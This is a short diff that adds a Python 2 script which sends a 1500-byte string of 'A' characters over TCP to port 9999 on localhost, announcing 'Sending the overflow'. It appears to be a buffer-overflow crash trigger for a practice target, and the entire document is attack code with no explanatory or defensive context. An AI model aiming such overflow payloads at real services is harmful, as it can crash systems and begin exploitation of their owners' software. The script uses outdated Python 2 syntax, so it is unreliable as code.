@@ -1,0 +1,9 @@
+#!/bin/python
+import socket
+
+payload = "A" * 1500
+print "Sending the overflow"
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect=s.connect(('127.0.0.1',9999))
+s.send(payload)
+s.close()
